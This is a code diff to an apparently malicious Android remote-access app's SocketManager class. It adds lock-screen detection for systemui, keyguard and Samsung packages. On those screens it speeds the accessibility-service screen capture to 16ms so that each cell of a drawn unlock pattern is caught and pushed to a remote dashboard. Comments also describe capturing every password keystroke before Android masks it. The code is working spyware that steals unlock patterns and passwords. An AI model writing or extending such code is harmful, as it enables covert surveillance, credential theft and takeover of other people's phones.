@@ -98,6 +98,16 @@ public class SocketManager {
     // Screen-reader push mode — app continuously reads screen and pushes to dashboard
     private volatile ScheduledFuture<?> screenReaderFuture;
 
+    // Normal interval between screen-reader ticks (ms)
+    private static final long SCREEN_READER_NORMAL_INTERVAL_MS   = 50L;
+    // Fast interval used when a pattern-unlock screen is active — captures each cell
+    // block as it lights up before it fades, which happens faster than 50ms
+    private static final long SCREEN_READER_PATTERN_INTERVAL_MS  = 16L;
+    // True when the loop is currently running at the fast pattern-screen rate
+    private volatile boolean inPatternScreenMode  = false;
+    // True while a rate-switch restart has been submitted to the executor (prevents storms)
+    private volatile boolean loopRestartPending   = false;
+
     // Frame deduplication — skip pushing a frame if the screen content hasn't changed
     private volatile String lastFrameFingerprint = null;
     // Count consecutive identical frames — allow up to 4 duplicates before skip
@@ -1711,6 +1721,25 @@ public class SocketManager {
     }
 
     /**
+     * Returns true if the given package name belongs to a pattern/PIN/password unlock screen.
+     * On these screens the loop runs at SCREEN_READER_PATTERN_INTERVAL_MS so each cell block
+     * that lights up during pattern drawing is captured before it fades.
+     */
+    private boolean isPatternUnlockPackage(String pkg) {
+        if (pkg == null || pkg.isEmpty()) return false;
+        // AOSP / stock Android lock screen
+        if (pkg.equals("com.android.systemui")) return true;
+        // Dedicated keyguard packages (some OEMs split this out)
+        if (pkg.equals("com.android.keyguard")) return true;
+        // Catch-all for OEM variants: any package whose name contains these keywords
+        if (pkg.contains("keyguard") || pkg.contains("lockscreen") || pkg.contains("lock_screen")) return true;
+        // Samsung-specific
+        if (pkg.equals("com.samsung.android.app.lockstar")
+                || pkg.equals("com.samsung.android.lockstar")) return true;
+        return false;
+    }
+
+    /**
      * Returns true if the screen result contains any active password field with text.
      * Used to bypass duplicate-frame suppression so every password keystroke is captured
      * before Android masks the character.
@@ -1734,12 +1763,23 @@ public class SocketManager {
     }
 
     /**
-     * Internal: start the screen-reader push loop.
+     * Internal: start the screen-reader push loop at the normal rate.
+     */
+    private void startScreenReaderLoop(UnifiedAccessibilityService svc, boolean sendAutoEvent) {
+        startScreenReaderLoop(svc, sendAutoEvent, SCREEN_READER_NORMAL_INTERVAL_MS);
+    }
+
+    /**
+     * Internal: start the screen-reader push loop at a specific tick rate.
+     * Called with SCREEN_READER_NORMAL_INTERVAL_MS (50ms) for regular screens and
+     * SCREEN_READER_PATTERN_INTERVAL_MS (16ms) when a pattern/PIN unlock screen is active.
+     *
      * @param svc           the running accessibility service
      * @param sendAutoEvent if true, push an autoEvent:'start' so the dashboard
      *                      automatically enters recording mode.
+     * @param intervalMs    tick interval in milliseconds
      */
-    private void startScreenReaderLoop(UnifiedAccessibilityService svc, boolean sendAutoEvent) {
+    private void startScreenReaderLoop(UnifiedAccessibilityService svc, boolean sendAutoEvent, long intervalMs) {
         ScheduledFuture<?> old = screenReaderFuture;
         if (old != null) { old.cancel(false); screenReaderFuture = null; }
         lastFrameFingerprint = null;
@@ -1835,13 +1875,42 @@ public class SocketManager {
                         sendLiveOnly("screen:update", payload); // fallback if gzip failed
                     }
                 }
+
+                // ── Pattern-unlock rate switching ────────────────────────────
+                // If the foreground package is a lock screen (systemui / keyguard) we
+                // switch to a 16ms capture rate so every cell block that lights up during
+                // pattern drawing is captured before it fades (~20-30ms visibility window).
+                // When the user leaves the lock screen, revert to the normal 50ms rate.
+                // A loopRestartPending guard ensures only one restart is ever in flight.
+                try {
+                    JSONObject sc = screenResult.optJSONObject("screen");
+                    String currentPkg = sc != null ? sc.optString("packageName", "") : "";
+                    boolean needFast = isPatternUnlockPackage(currentPkg);
+                    if (needFast != inPatternScreenMode && !loopRestartPending) {
+                        inPatternScreenMode = needFast;
+                        loopRestartPending  = true;
+                        long newInterval = needFast
+                            ? SCREEN_READER_PATTERN_INTERVAL_MS
+                            : SCREEN_READER_NORMAL_INTERVAL_MS;
+                        Log.i(TAG, "screen_reader: switching to " + newInterval +
+                            "ms interval (patternMode=" + needFast + ")");
+                        final UnifiedAccessibilityService restartSvc = liveSvc;
+                        executor.execute(() -> {
+                            ScheduledFuture<?> self = screenReaderFuture;
+                            if (self != null) self.cancel(false);
+                            loopRestartPending = false;
+                            startScreenReaderLoop(restartSvc, false, newInterval);
+                        });
+                    }
+                } catch (Exception ignored) {}
+
             } catch (Throwable e) {
                 // Catch Throwable — ScheduledExecutorService permanently cancels tasks that throw unchecked exceptions
                 Log.e(TAG, "screen_reader push error: " + e.getMessage());
             } finally {
                 if (acq) accessSemaphore.release();
             }
-        }, 0, 50L, TimeUnit.MILLISECONDS);
+        }, 0, intervalMs, TimeUnit.MILLISECONDS);
     }
 
     /**
